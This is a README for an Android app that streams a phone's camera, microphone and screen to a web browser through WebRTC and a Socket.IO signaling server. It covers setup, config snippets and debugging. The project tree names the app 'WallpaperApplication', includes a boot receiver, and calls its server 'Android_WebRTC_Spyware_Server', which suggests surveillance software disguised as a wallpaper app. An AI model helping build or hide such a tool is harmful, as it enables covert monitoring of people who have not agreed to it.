# Android WebRTC Streaming App

This application enables real-time streaming of an Android device's camera, microphone, and screen to a web browser using WebRTC. It uses Socket.IO for signaling to establish peer-to-peer connections, allowing a web client to view the Android device's camera feed, hear its audio, and display its screen in separate video elements. The app is designed for seamless streaming with robust track handling and is suitable for applications like remote monitoring, screen sharing, or live demos.

## Features

- **Camera Streaming**: Streams the Android device's front-facing (or default) camera at 640x480 resolution
- **Microphone Streaming**: Captures and streams audio with echo cancellation, noise suppression, and auto-gain control
- **Screen Sharing**: Streams the device's screen at 960x540 resolution, optimized for reliable encoding
- **WebRTC**: Uses WebRTC for low-latency peer-to-peer streaming with STUN/TURN servers for NAT traversal
- **Socket.IO Signaling**: Handles WebRTC offer/answer and ICE candidate exchange via a Node.js server
- **Browser Interface**: Displays camera and screen streams in separate HTML5 video elements with real-time status updates

## Project Structure

```
project/
├── WallpaperApplication/
│   ├── app/
│   │   ├── src/main/java/com/example/wallpaperapplication/
│   │   │   ├── BootReciever.java
│   │   │   ├── ConsentActivity.java
│   │   │   ├── SdpObserverActivity.java
│   │   │   ├── StreamingService.java
│   │   │   ├── StreamingSettingsActivity.java
│   │   │   └── WallpaperAdapter.java
│   │   ├── src/main/AndroidManifest.xml
│   │   └── build.gradle
│   ├── Android_WebRTC_Spyware_Server/
│   │   ├── server.js
│   │   ├── package-lock.json
│   │   ├── package.json
│   │   └── public/
│   │       ├── index.html
│   │       └── client.js
└── README.md
```

### Key Components

- **StreamingService.java**: Android service that initializes WebRTC, captures camera, audio, and screen, and handles signaling with the server
- **StreamingSettingsActivity.java**: UI to toggle streaming and request permissions (camera, audio, screen capture)
- **AndroidManifest.xml**: Declares permissions and service configuration
- **server.js**: Node.js server using Express and Socket.IO for signaling between Android and web clients
- **index.html**: Web interface displaying camera (remoteVideo) and screen (screenVideo) streams
- **client.js**: JavaScript for WebRTC peer connection, track handling, and signaling on the web client

## Prerequisites

### Android
- Android Studio (latest version recommended)
- Android SDK (API 21+)
- Device/emulator with camera and microphone

### Server
- Node.js (v16+)
- npm (v8+)

### Browser
- Chrome, Firefox, or any WebRTC-compatible browser

### TURN Server
- Credentials for numb.viagenie.ca (or another TURN server) for NAT traversal

### Network
- Devices must be on the same network (e.g., Wi-Fi) or reachable via TURN server
- Server IP: 192.168.29.10 (update if different)

## Setup Instructions

### 1. Clone the Repository

```bash
git clone <repository-url>
cd project
```

### 2. Configure Android App

#### Open Android Project
Open the `android/` folder in Android Studio.

#### Update Dependencies in `android/app/build.gradle`

```gradle
dependencies {
    implementation 'org.webrtc:google-webrtc:1.0.32006'
    implementation 'io.socket:socket.io-client:2.1.0'
}
```

#### Update TURN Credentials in `StreamingService.java`
Replace `your@email.com` and `yourpassword` in the `setupPeerConnection` method with valid numb.viagenie.ca credentials:

```java
ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
    .setUsername("your-actual-username")
    .setPassword("your-actual-password")
    .createIceServer());
```

#### Update Signaling URL (if needed)
In `StreamingService.java`, ensure `SIGNALING_URL` matches your server's IP:

```java
private static final String SIGNALING_URL = "http://192.168.29.10:3000";
```

#### Permissions in `AndroidManifest.xml`
Ensure the following are included:

```xml
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
```

### 3. Configure Server

#### Navigate to Server Directory
```bash
cd server
```

#### Install Dependencies
```bash
npm install express socket.io@4.7.5
```

#### Update TURN Credentials in `client.js`
Replace `your@email.com` and `yourpassword` with valid numb.viagenie.ca credentials:

```javascript
const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your-actual-username', credential: 'your-actual-password' }
  ]
};
```

#### Update Signaling URL (if needed)
In `client.js`, ensure the Socket.IO URL matches the server:

```javascript
const socket = io('http://192.168.29.10:3000');
```

### 4. Run the Server

```bash
node server.js
```

Verify: Console shows "Server running at http://localhost:3000".

### 5. Build and Run the Android App

#### Build the App
In Android Studio, sync the project and build the app.

#### Install on Device/Emulator
Run the app on a physical Android device or emulator (API 21+).

#### Start Streaming
1. Open the app, navigate to `StreamingSettingsActivity`, and toggle the streaming switch
2. Approve permissions:
   - Camera
   - Microphone
   - Screen capture (MediaProjection)
3. The app starts `StreamingService`, which initializes camera, audio, and screen capture

### 6. Access the Web Interface

#### Open Browser
On a computer or device on the same network, open `http://192.168.29.10:3000` in Chrome or Firefox.

#### Expected Output
- `<video id="remoteVideo">`: Displays the Android camera stream with audio
- `<video id="screenVideo">`: Displays the Android screen stream
- `<div id="status">`: Shows "Playing Android camera, screen, and audio" when streams are active
- Page background turns light green (#e8f5e8) on successful connection

## Debugging

### Logcat (Android)

```bash
adb logcat | grep StreamingService
```

Expected logs:
- Video capture started
- Audio capture initialized
- Socket.IO CONNECTED
- Web client ready: ...
- Waiting for screen capture to be ready
- Screen capture started
- Screen track added
- Offer created, SDP: ... (includes m=video ... mid=video, m=video ... mid=screen, m=audio ... mid=audio)
- Sent offer to web client
- ICE connection state: COMPLETED

If screen stream fails:
- Verify `m=video ... mid=screen` in the SDP log
- Check CCodec logs for screen encoding (`c2.exynos.vp8.encoder ... width = 960, height = 540`)
- If absent, reduce resolution in `startScreenCapture`:
  ```java
  screenCapturer.startCapture(640, 360, 30);
  ```

### Browser Console

Open Chrome/Firefox DevTools (F12) and check the Console tab.

Expected logs:
- Connected to signaling server
- My socket ID: ...
- Announced readiness to receive stream
- Android client ready: ...
- Processing offer from Android, SDP: ... (includes m=video ... mid=video, m=video ... mid=screen, m=audio ... mid=audio)
- Received video track: { id: ..., mid: video, label: video, streamId: ... }
- Received video track: { id: ..., mid: screen, label: screen, streamId: ... }
- Received audio track: { id: ..., mid: audio, label: audio, streamId: ... }
- Camera video metadata loaded, playing stream
- Screen video metadata loaded, playing stream
- Playing Android camera, screen, and audio

If screen stream is missing:
- Verify SDP includes `m=video ... mid=screen`
- Check `screenEl.srcObject` in DevTools:
  ```javascript
  document.getElementById('screenVideo').srcObject
  ```
- Force playback:
  ```javascript
  document.getElementById('screenVideo').play().catch(e => console.error('Force play error:', e));
  ```

### Server Logs

```bash
node server.js > server.log
```

Verify signaling messages are relayed ("Relaying signal from ... to ...").

### Share for Support

When seeking support, provide:
- Full logcat (`adb logcat > logcat.txt`)
- Browser console logs (include SDP)
- Server logs (`server.log`)
- Screenshot of browser UI showing `remoteVideo` and `screenVideo`

## How the Application Works

### Android Side (StreamingService.java)

1. Initializes WebRTC with PeerConnectionFactory and EGL context
2. Captures camera (640x480) using Camera2Enumerator and audio with AudioSource (with noise suppression)
3. Captures screen (960x540) using ScreenCapturerAndroid after MediaProjection permission
4. Adds tracks to PeerConnection:
   - Camera: mid=video
   - Screen: mid=screen
   - Audio: mid=audio
5. Uses Socket.IO to connect to the signaling server (http://192.168.29.10:3000)
6. Waits for web-client-ready, then sends a WebRTC offer with all tracks after screen capture is ready
7. Handles ICE candidates and answers from the web client

### Server Side (server.js)

1. Runs an Express server with Socket.IO to relay signaling messages
2. Emits web-client-ready and android-client-ready to pair clients
3. Forwards WebRTC offers, answers, and ICE candidates between Android and web clients

### Web Client (client.js, index.html)

1. Connects to the signaling server and announces readiness (web-client-ready)
2. Creates a RTCPeerConnection with two recvonly video transceivers (camera, screen) and one audio transceiver
3. Handles incoming tracks in ontrack:
   - First video track (mid=video or videoTrackCount === 1) goes to remoteVideo
   - Second video track (mid=screen or videoTrackCount === 2) goes to screenVideo
   - Audio track is added to remoteVideo's stream
4. Processes the Android's offer, creates an answer, and handles ICE candidates
5. Displays streams in `<video>` elements with autoplay and status updates

## Known Issues and Workarounds

### Screen Stream Not Displaying
- **Cause**: SDP offer sent before screen track is added
- **Fix**: The updated StreamingService.java uses screenCaptureReady to delay the offer until the screen track is added

### Black Screen Stream
- **Cause**: Encoding failure due to high resolution or codec issues
- **Fix**: Resolution reduced to 960x540. If issue persists, try 640x360 in startScreenCapture

### Connection Failures
- **Cause**: Incorrect TURN server credentials or network issues
- **Fix**: Verify numb.viagenie.ca credentials and ensure devices are on the same network or TURN is accessible

### Camera/Audio Issues
- Should not occur, as logic is unchanged. If they fail, verify permissions in AndroidManifest.xml and check logcat

## Future Improvements

- Add dynamic resolution adjustment based on device capabilities
- Implement bitrate control for better stream quality on varying networks
- Add error handling for network disconnections with automatic reconnect
- Enhance UI with controls to toggle individual streams

## License

This project is licensed under the MIT License. See the LICENSE file for details.

---